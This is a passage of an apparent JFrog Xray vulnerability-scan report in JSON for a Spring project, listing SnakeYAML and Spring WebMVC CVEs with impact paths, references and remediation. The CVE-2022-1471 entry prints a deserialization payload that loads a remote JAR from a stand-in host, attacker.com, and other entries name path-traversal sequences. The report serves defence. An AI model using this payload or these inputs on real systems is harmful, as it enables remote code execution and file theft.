                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253429",
        "references": [
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://github.com/advisories/GHSA-hhhw-99gj-p3c3",
          "https://security.gentoo.org/glsa/202305-28",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38750",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nWhen loading a YAML document, SnakeYAML uses recursion to parse objects from the document.\n\nIt was discovered that a crafted YAML file containing a deeply nested YAML can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data."
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service."
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-41854",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ]
          }
        ],
        "summary": "Those using Snakeyaml to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow. This effect may support a denial of service attack.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.32]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-261206",
        "references": [
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/531",
          "https://security.netapp.com/advisory/ntap-20240621-0006",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE/",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/e230a1758842beec93d28eddfde568c21774780a",
          "https://security.netapp.com/advisory/ntap-20240315-0009/",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-41854",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50355",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7MKE4XWRXTH32757H7QJU4ACS67DYDCR/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE",
          "https://github.com/advisories/GHSA-w37g-rhq8-7m4j",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J",
          "https://security.netapp.com/advisory/ntap-20240621-0006/",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KSPAJ5Y45A4ZDION2KN5RDWLHK4XKY2J/",
          "https://security.netapp.com/advisory/ntap-20240315-0009",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3DDXEXXWAZGF5AVHIPGFPXIWL6TSMKJE"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nWhen loading a YAML document, SnakeYAML uses recursion to parse objects from the document.\n\nIt was discovered that a crafted YAML file containing a deeply nested YAML can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/543/stackoverflow-oss-fuzz-50355)\n\nDespite the vulnerability being fixed and patched on SnakeYAML v1.32 or later, a non-default configuration (`setAllowRecursiveKeys(true);`) allows this issue to still be exploitable.\nHowever, such a configuration is very rare.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.\nOn patched versions, a non-default configuration must be used for the issue to be exploited.",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data."
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service."
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-1471",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-20",
              "CWE-502",
              "CWE-913"
            ]
          }
        ],
        "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.",
        "severity": "Critical",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[2.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-262821",
        "references": [
          "https://security.netapp.com/advisory/ntap-20230818-0015",
          "https://github.com/advisories/GHSA-mjmj-j48q-9wg2",
          "https://infosecwriteups.com/%EF%B8%8F-inside-the-160-comment-fight-to-fix-snakeyamls-rce-default-1a20c5ca4d4c",
          "https://confluence.atlassian.com/security/cve-2022-1471-snakeyaml-library-rce-vulnerability-in-multiple-products-1296171009.html",
          "http://www.openwall.com/lists/oss-security/2023/11/19/1",
          "https://github.com/pytorch/serve",
          "https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471",
          "https://security.netapp.com/advisory/ntap-20230818-0015/",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/acc44099f5f4af26ff86b4e4e4cc1c874e2dc5c4",
          "https://github.com/mbechler/marshalsec",
          "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64634374",
          "http://packetstormsecurity.com/files/175095/PyTorch-Model-Server-Registration-Deserialization-Remote-Code-Execution.html",
          "https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64876314",
          "https://github.com/pytorch/serve/pull/2523",
          "https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471",
          "https://security.netapp.com/advisory/ntap-20240621-0006",
          "https://groups.google.com/g/kubernetes-security-announce/c/mwrakFaEdnc",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/5014df1a36f50aca54405bb8433bc99a8847f758",
          "https://github.com/pytorch/serve/security/advisories/GHSA-4mqg-h5jf-j9m7",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479",
          "https://security.netapp.com/advisory/ntap-20240621-0006/",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-1471"
        ],
        "extended_information": {
          "short_description": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution."
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments."
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates remote code execution."
            }
          ],
          "remediation": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38816",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-22"
            ]
          }
        ],
        "summary": "Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.\n\nSpecifically, an application is vulnerable when both of the following are true:\n\n  *  the web application uses RouterFunctions to serve static resources\n  *  resource handling is explicitly configured with a FileSystemResource location\n\n\nHowever, malicious requests are blocked and rejected when any of the following is true:\n\n  *  the  Spring Security HTTP Firewall https://docs.spring.io/spring-security/reference/servlet/exploits/firewall.html  is in use\n  *  the application runs on Tomcat or Jetty",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.31": {
            "fixed_versions": [
              "[6.1.13]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-643087",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38816",
          "https://security.netapp.com/advisory/ntap-20241227-0001/",
          "https://security.netapp.com/advisory/ntap-20241227-0001",
          "https://github.com/spring-projects/spring-framework/commit/d86bf8b2056429edf5494456cffcb2b243331c49",
          "https://github.com/advisories/GHSA-cx7f-g6mp-7hqm",
          "https://spring.io/security/cve-2024-38816"
        ],
        "extended_information": {
          "short_description": "Path traversal in Spring WebMvc and WebFlux with non-default configuration allows network attackers to leak arbitrary files.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote leak of arbitrary files"
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability is exploitable only if all of the following conditions are true -\n1. The Spring application uses `RouterFunctions` to serve static resources\n2. Resource handling is explicitly configured with a `FileSystemResource` location\n3. The Spring Security HTTP firewall is disabled\n4. The Spring application is not served by Apache Tomcat or Eclipse Jetty\n\nExample of Spring code that fulfills conditions 1\u00262 -\n```java\nResource location = new FileSystemResource(\"public-resources/\");\nRouterFunction\u003cServerResponse\u003e resources = RouterFunctions.resources(\"/resources/**\", location);\n```\n\nConditions 3 \u0026 4 are very unlikely since -\n*  The Spring Security HTTP firewall is enabled by default, for every Spring Boot application that has Spring Security included in its classpath\n\n* Apache Tomcat is the default Servlet container for Spring Boot",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker can simply send an HTTP request for a static resource that contains path traversal characters (`../`) in order to fetch arbitrary files from the server"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38819",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-22"
            ]
          }
        ],
        "summary": "Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.31": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-646856",
        "references": [
          "https://github.com/advisories/GHSA-g5vr-rgqm-vf78",
          "https://spring.io/security/cve-2024-38819",
          "https://github.com/spring-projects/spring-framework/commit/fb7890d73975a3d9e0763e0926df2bd0a608e87e",
          "https://github.com/spring-projects/spring-framework/issues/33689",
          "https://github.com/spring-projects/spring-framework/commit/3bfbe30a7814c9ea1556d40df9bd87ddb3ba372d",
          "https://security.netapp.com/advisory/ntap-20250110-0010/",
          "https://security.netapp.com/advisory/ntap-20250110-0010",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38819"
        ],
        "extended_information": {
          "short_description": "Path traversal in Spring WebMvc and WebFlux with non-default configuration allows network attackers to leak arbitrary files.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote leak of arbitrary files"
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability is exploitable only if all of the following conditions are true -\n1. The Spring application uses `RouterFunctions` to serve static resources\n2. Resource handling is explicitly configured with a `FileSystemResource` location\n3. The Spring Security HTTP firewall is disabled\n4. The Spring application is not served by Apache Tomcat or Eclipse Jetty\n\nExample of Spring code that fulfills conditions 1\u00262 -\n```java\nResource location = new FileSystemResource(\"public-resources/\");\nRouterFunction\u003cServerResponse\u003e resources = RouterFunctions.resources(\"/resources/**\", location);\n```\n\nConditions 3 \u0026 4 are very unlikely since -\n*  The Spring Security HTTP firewall is enabled by default, for every Spring Boot application that has Spring Security included in its classpath\n\n* Apache Tomcat is the default Servlet container for Spring Boot",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker can simply send an HTTP request for a static resource that contains encoded path traversal characters (`%2E%2E%2F`) in order to fetch arbitrary files from the server"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-41242",
            "cvss_v3_score": "5.9",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-22"
            ]
          }
        ],
        "summary": "Spring Framework MVC applications can be vulnerable to a “Path Traversal Vulnerability” when deployed on a non-compliant Servlet container.\n\nAn application can be vulnerable when all the following are true:\n\n  *  the application is deployed as a WAR or with an embedded Servlet container\n  *  the Servlet container  does not reject suspicious sequences https://jakarta.ee/specifications/servlet/6.1/jakarta-servlet-spec-6.1.html#uri-path-canonicalization \n  *  the application  serves static resources https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/static-resources.html#page-title  with Spring resource handling\n\n\nWe have verified that applications deployed on Apache Tomcat or Eclipse Jetty are not vulnerable, as long as default security features are not disabled in the configuration. Because we cannot check exploits against all Servlet containers and configuration variants, we strongly recommend upgrading your application.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.31": {
            "fixed_versions": [
              "[6.2.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-714941",
        "references": [
          "https://github.com/advisories/GHSA-r936-gwx5-v52f",
          "http://spring.io/security/cve-2025-41242",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-41242"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38828",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-400"
            ]
          }
        ],
        "summary": "Spring MVC controller methods with an @RequestBody byte[] method parameter are vulnerable to a DoS attack.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-webmvc:5.3.31": {
            "fixed_versions": [
              "[5.3.42]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-654589",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38828",
          "https://spring.io/security/cve-2024-38828",
          "https://github.com/advisories/GHSA-w3c8-7r8f-9jp8",
          "https://security.netapp.com/advisory/ntap-20250509-0009",
          "https://security.netapp.com/advisory/ntap-20250509-0009/"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-52999",
            "cwe": [
              "CWE-121"
            ]
          }
        ],
